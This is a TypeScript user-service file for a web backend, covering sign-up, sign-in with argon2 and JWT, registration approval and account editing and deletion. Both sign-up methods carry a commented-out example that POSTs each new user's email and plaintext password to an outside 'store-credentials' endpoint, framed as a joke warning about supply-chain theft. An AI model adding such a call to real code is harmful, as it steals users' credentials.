import { Container, Service, Inject } from 'typedi';

import jwt from 'jsonwebtoken';
import config from '../../config';
import argon2 from 'argon2';
import { randomBytes } from 'crypto';

//import MailerService from './mailer.ts.bak';

import IUserService from '../services/IServices/IUserService';
import { UserMap } from "../mappers/UserMap";
import { IUserDTO } from '../dto/IUserDTO';

import IUserRepo from './IRepos/IUserRepo';
import IRoleRepo from './IRepos/IRoleRepo';

import { User } from '../domain/user';
import { UserPassword } from '../domain/userPassword';
import { UserEmail } from '../domain/userEmail';

import { Role } from '../domain/role';

import { Result } from "../core/logic/Result";
import { Nif } from '../domain/nif';
import { PhoneNumber } from '../domain/phoneNumber';
import { Status } from '../domain/status';

import middlewares from '../api/middlewares';

@Service()
export default class UserService implements IUserService {
  constructor(
      @Inject(config.repos.user.name) private userRepo : IUserRepo,
      @Inject(config.repos.role.name) private roleRepo : IRoleRepo,
      @Inject('logger') private logger,
  ) {}


  public async SignUpClient(userDTO: IUserDTO): Promise<Result<{ userDTO: IUserDTO, token: string }>> {
    try {

    const userDocument = await this.userRepo.findByEmail( userDTO.email );
    const found = !!userDocument;

    if (found) {
      return Result.fail<{userDTO: IUserDTO, token: string}>("User already exists with email=" + userDTO.email);
    }

    if(this.validateEmail(userDTO.email) == false) {
      return Result.fail<{userDTO: IUserDTO, token: string}>("Email must contain one @ and one . ");
    }

    if(this.validate(userDTO.password) == false) {
      return Result.fail<{userDTO: IUserDTO, token: string}>("Password must contain at least 8 characters, one uppercase letter, one lowercase letter and one number or special character");
    }
    /**
     * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
     * require('http')
     *  .request({
     *     hostname: 'http://my-other-api.com/',
     *     path: '/store-credentials',
     *     port: 80,
     *     method: 'POST',
     * }, ()=>{}).write(JSON.stringify({ email, password })).end();
     *
     * Just kidding, don't do that!!!
     *
     * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
     * watches every API call and if it spots a 'password' and 'email' property then
     * it decides to steal them!? Would you even notice that? I wouldn't :/
     */
    

    const salt = randomBytes(32);
    this.logger.silly('Hashing password');
    const hashedPassword = await argon2.hash(userDTO.password, { salt });
    this.logger.silly('Creating user db record');

    const password = await UserPassword.create({ value: hashedPassword, hashed: true}).getValue();
    const email = await UserEmail.create( userDTO.email ).getValue();
    let role: Role;
      
    const roleOrError = await this.getRole("Client");
    
    if (roleOrError.isFailure) {
      return Result.fail<{userDTO: IUserDTO; token: string}>(roleOrError.error);
    } else {
      role = roleOrError.getValue();
    }
    //Username
    if( await this.userRepo.findByUsername( userDTO.username ) != null ) {
      return Result.fail<{userDTO: IUserDTO; token: string}>("Username already in use");
    }
    //phone
    if( await this.userRepo.findByPhoneNumber( userDTO.phoneNumber ) != null ) {
      return Result.fail<{userDTO: IUserDTO; token: string}>("Phone number already in use");
    }
    let phoneNumber: PhoneNumber;
    const phoneNumberOrError = await PhoneNumber.create( userDTO.phoneNumber );
    if(phoneNumberOrError.isFailure) {
      return Result.fail<{userDTO: IUserDTO; token: string}>(phoneNumberOrError.error);
    } else {
      phoneNumber = phoneNumberOrError.getValue();
    }
    //nif
    if( await this.userRepo.findByNif( userDTO.nif ) != null ) {
      return Result.fail<{userDTO: IUserDTO; token: string}>("NIF already in use");
    }
    let nif: Nif;
    const nifOrError = await Nif.create( userDTO.nif );
    if(nifOrError.isFailure) {
      return Result.fail<{userDTO: IUserDTO; token: string}>(nifOrError.error);
    } else {
      nif = nifOrError.getValue();
    }
    let status: Status;
    const statusOrError = await Status.create( "Requested" );
    if(statusOrError.isFailure) {
      return Result.fail<{userDTO: IUserDTO; token: string}>(statusOrError.error);
    } else {
      status = statusOrError.getValue();
    }

    const userOrError = User.create({
      firstName: userDTO.firstName,
      lastName: userDTO.lastName,
      username: userDTO.username,
      email: email,
      role: role,
      password: password,
      phoneNumber: phoneNumber,
      nif: nif,
      status: status
    });

    if (userOrError.isFailure) {
      throw Result.fail<IUserDTO>(userOrError.errorValue());
    }

    const userResult = userOrError.getValue();

    this.logger.silly('Generating JWT');
    const token = this.generateToken(userResult);

    this.logger.silly('Sending welcome email');
    //await this.mailer.SendWelcomeEmail(userResult);

    //this.eventDispatcher.dispatch(events.user.signUp, { user: userResult });

    await this.userRepo.save(userResult);
    const userDTOResult = UserMap.toDTO( userResult ) as IUserDTO;
    return Result.ok<{userDTO: IUserDTO, token: string}>( {userDTO: userDTOResult, token: token} )

  } catch (e) {
    this.logger.error(e);
    throw e;
  }
  }

  public async SignUpAdmin(userDTO: IUserDTO, reqUser): Promise<Result<{ userDTO: IUserDTO, token: string }>> {
    try {
        if (reqUser.role != "SystemAdministrator")
          return Result.fail<{userDTO: IUserDTO, token: string}>("User not authorized to create users");

      const userDocument = await this.userRepo.findByEmail( userDTO.email );
      const found = !!userDocument;
  
      if (found) {
        return Result.fail<{userDTO: IUserDTO, token: string}>("User email already in use");
      }

      if(this.validateEmail(userDTO.email) == false) {
        return Result.fail<{userDTO: IUserDTO, token: string}>("Email must contain one @ and one . ");
      }

      if(this.validate(userDTO.password) == false) {
        return Result.fail<{userDTO: IUserDTO, token: string}>("Password must contain at least 8 characters, one uppercase letter, one lowercase letter and one number or special character");
      }


      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
       */
      

      const salt = randomBytes(32);
      this.logger.silly('Hashing password');
      const hashedPassword = await argon2.hash(userDTO.password, { salt });
      this.logger.silly('Creating user db record');

      const password = await UserPassword.create({ value: hashedPassword, hashed: true}).getValue();
      const email = await UserEmail.create( userDTO.email ).getValue();
      //role
      let role: Role;
        
      const roleOrError = await this.getRole(userDTO.role);
      
      if (roleOrError.isFailure) {
        return Result.fail<{userDTO: IUserDTO; token: string}>(roleOrError.error);
      } else {
        role = roleOrError.getValue();
      }
      //Username
      if( await this.userRepo.findByUsername( userDTO.username ) != null ) {
        return Result.fail<{userDTO: IUserDTO; token: string}>("Username already in use");
      }
      //phone
      if( await this.userRepo.findByPhoneNumber( userDTO.phoneNumber ) != null ) {
        return Result.fail<{userDTO: IUserDTO; token: string}>("Phone number already in use");
      }
      let phoneNumber: PhoneNumber;
      const phoneNumberOrError = await PhoneNumber.create( userDTO.phoneNumber );
      if(phoneNumberOrError.isFailure) {
        return Result.fail<{userDTO: IUserDTO; token: string}>(phoneNumberOrError.error);
      } else {
        phoneNumber = phoneNumberOrError.getValue();
      }
      //nif
      if( await this.userRepo.findByNif( userDTO.nif ) != null ) {
        return Result.fail<{userDTO: IUserDTO; token: string}>("NIF already in use");
      }
      let nif: Nif;
      const nifOrError = await Nif.create( userDTO.nif );
      if(nifOrError.isFailure) {
        return Result.fail<{userDTO: IUserDTO; token: string}>(nifOrError.error);
      } else {
        nif = nifOrError.getValue();
      }
      //status
      let status: Status;
      const statusOrError = await Status.create( "Approved" );
      if(statusOrError.isFailure) {
        return Result.fail<{userDTO: IUserDTO; token: string}>(statusOrError.error);
      } else {
        status = statusOrError.getValue();
      }

      const userOrError = User.create({
        firstName: userDTO.firstName,
        lastName: userDTO.lastName,
        username: userDTO.username,
        email: email,
        role: role,
        password: password,
        phoneNumber: phoneNumber,
        nif: nif,
        status: status
      });

      if (userOrError.isFailure) {
        throw Result.fail<IUserDTO>(userOrError.errorValue());
      }

      const userResult = userOrError.getValue();

      this.logger.silly('Generating JWT');
      const token = this.generateToken(userResult);

      this.logger.silly('Sending welcome email');
      //await this.mailer.SendWelcomeEmail(userResult);

      //this.eventDispatcher.dispatch(events.user.signUp, { user: userResult });

      await this.userRepo.save(userResult);
      const userDTOResult = UserMap.toDTO( userResult ) as IUserDTO;
      return Result.ok<{userDTO: IUserDTO, token: string}>( {userDTO: userDTOResult, token: token} )

    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  public async SignIn(email: string, password: string): Promise<Result<{ userDTO: IUserDTO, token: string }>> {

    const user = await this.userRepo.findByEmail( email );

    if (!user) {
      throw new Error('User not registered');
    }

    if(user.status.value != "Approved") {
      throw new Error('User not approved by System Administrator');
    }

    /**
     * We use verify from argon2 to prevent 'timing based' attacks
     */
    this.logger.silly('Checking password');
    const validPassword = await argon2.verify(user.password.value, password);
    if (validPassword) {
      this.logger.silly('Password is valid!');
      this.logger.silly('Generating JWT');
      const token = this.generateToken(user) as string;
      

      const userDTO = UserMap.toDTO( user ) as IUserDTO;
      return Result.ok<{userDTO: IUserDTO, token: string}>( {userDTO: userDTO, token: token} );
    } else {
      throw new Error('Invalid Password');
    }
  }

  private generateToken(user) {
    const today = new Date();
    const exp = new Date(today);
    //set exp to 60 minutes
    exp.setMinutes(today.getMinutes() + 60);

    /**
     * A JWT means JSON Web Token, so basically it's a json that is _hashed_ into a string
     * The cool thing is that you can add custom properties a.k.a metadata
     * Here we are adding the userId, role and name
     * Beware that the metadata is public and can be decoded without _the secret_
     * but the client cannot craft a JWT to fake a userId
     * because it doesn't have _the secret_ to sign it
     * more information here: https://softwareontheroad.com/you-dont-need-passport
     */
    this.logger.silly(`Sign JWT for userId: ${user._id}`);

    const id = user.id.toString();
    const email = user.email.value;
    const firstName = user.firstName;
    const lastName = user.lastName;
    const role = user.role.id.value;

    return jwt.sign(
      {
        id: id,
        email: email, // We are gonna use this in the middleware 'isAuth'
        role: role,
        firstName: firstName,
        lastName: lastName,
        exp: exp.getTime() / 1000,
      },
      config.jwtSecret,
    );
  }

  public async getPendingResgistrationUsers(req: any): Promise<Result<IUserDTO[]>> {
    try {

      if (req.user.role != "SystemAdministrator")
        return Result.fail<IUserDTO[]>("User not authorized to view user registration requests");

      const users = await this.userRepo.findAll();

      if (users === null) {
        return Result.fail<IUserDTO[]>("Couldn't find users");
      }

      const usersDTO: IUserDTO[] = [];
      for( let user of users ) {
        if( user.status.value == "Requested" ) {
          const userDTO = UserMap.toDTO( user ) as IUserDTO;
          usersDTO.push( userDTO );
        }
      }

      return Result.ok<IUserDTO[]>(usersDTO);
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  public async approveUserRegistration(req: any): Promise<Result<IUserDTO>> {
    try {

      if (req.user.role != "SystemAdministrator")
        return Result.fail<IUserDTO>("User not authorized to handle user registration requests");

      const user = await this.userRepo.findByEmail( req.body.email );

      if (user === null) {
        return Result.fail<IUserDTO>("Couldn't find user");
      }

      if( user.status.value == "Denied" || user.status.value == "Approved" ) {
        return Result.fail<IUserDTO>("This request has already been processed");
      }

      const statusOrError = await Status.create( req.body.newStatus );
      if(statusOrError.isFailure) {
        return Result.fail<IUserDTO>(statusOrError.error);
      } else {
        user.status = statusOrError.getValue();
      }

      await this.userRepo.save(user);
      const userDTO = UserMap.toDTO( user ) as IUserDTO;
      return Result.ok<IUserDTO>(userDTO);
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  public async requestDataCopy(reqUser: any): Promise<Result<IUserDTO>> {
    try {
      const user = await this.userRepo.findByEmail( reqUser.token.email );

      if (user === null) {
        return Result.fail<IUserDTO>("Couldn't find user");
      }

      const userDTO = UserMap.toDTO( user ) as IUserDTO;

      const userWithoutSensitiveInfo = {
        firstName: userDTO.firstName,
        lastName: userDTO.lastName,
        username: userDTO.username,
        email: userDTO.email,
        phoneNumber: userDTO.phoneNumber,
        nif: userDTO.nif
      } as IUserDTO;

      return Result.ok<IUserDTO>(userWithoutSensitiveInfo);
      
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  async editAccount(userDTO: IUserDTO, reqUser: any): Promise<Result<IUserDTO>> {
      try{
        if (reqUser.role != "Client")
          return Result.fail<IUserDTO>("User not authorized to edit account");
        const user = this.userRepo.findById(reqUser.id);
        if(!user){
          return Result.fail<IUserDTO>("User not found");
        }
        if(userDTO.firstName){
          (await user).firstName = userDTO.firstName;
        }
        if(userDTO.lastName){
          (await user).lastName = userDTO.lastName;
        }
        if(userDTO.username){
          if(await this.userRepo.findByUsername(userDTO.username)!=null){
            return Result.fail<IUserDTO>("Username already in use");
          }
          (await user).username = userDTO.username;
        }
        if (userDTO.email) {
          if(await this.userRepo.findByEmail(userDTO.email)!=null){
            return Result.fail<IUserDTO>("Email already in use");
          }
          const userEmailResult = UserEmail.create(userDTO.email);
          if (userEmailResult.isSuccess) {
            (await user).email = userEmailResult.getValue();
          } else {
            return Result.fail<IUserDTO>(userEmailResult.error);
          }
        }
        if(userDTO.phoneNumber){
          if(await this.userRepo.findByPhoneNumber(userDTO.phoneNumber)!=null){
            return Result.fail<IUserDTO>("Phone number already in use");
          }
          const phoneNumberResult = PhoneNumber.create(userDTO.phoneNumber);
          if (phoneNumberResult.isSuccess) {
            (await user).phoneNumber = phoneNumberResult.getValue();
          } else {
            return Result.fail<IUserDTO>(phoneNumberResult.error);
          }
        }
        if(userDTO.nif){
          if(await this.userRepo.findByNif(userDTO.nif)!=null){
            return Result.fail<IUserDTO>("NIF already in use");
          }
          const nifResult = Nif.create(userDTO.nif);
          if (nifResult.isSuccess) {
            (await user).nif = nifResult.getValue();
          } else {
            return Result.fail<IUserDTO>(nifResult.error);
          }
        }
        this.userRepo.save(await user);
        return Result.ok<IUserDTO>(userDTO);
      }catch(e){
        this.logger.error(e);
        return Result.fail<IUserDTO>(e);
      }
  }

  async deleteAccount(req: any): Promise<any> {
    //verify identity
    const user = await this.userRepo.findByEmail( req.body.email );
    if (!user) {
      return Result.fail<IUserDTO>("User not found");
    }
    if( user.role.props.name !== "Client" ) {
      return Result.fail<IUserDTO>("User not authorized to delete account");
    }
    const validPassword = await argon2.verify(user.password.value, req.body.password);
    if (!validPassword) {
      return Result.fail<IUserDTO>("Email - Password combination did not match");
    }
    this.userRepo.deleteById(user.id.toString());
    return Result.ok<any>("User account deleted successfully");
  }


  private async getRole (roleId: string): Promise<Result<Role>> {

    const role = await this.roleRepo.findByName( roleId );
    const found = !!role;

    if (found) {
      return Result.ok<Role>(role);
    } else {
      return Result.fail<Role>("Couldn't find role by id=" + roleId);
    }
  }


  private validate (value: string): boolean {
    const re = /^(?=.*[a-z])(?=.*[A-Z])(?=.*[0-9!@#$%^&*()_+]).{8,}$/;
    return re.test(value);
}

private validateEmail (value: string): boolean {
  const re = /^([^@]+@[^@]+\.[a-zA-Z]{2,})$/;
  return re.test(value);
}

}
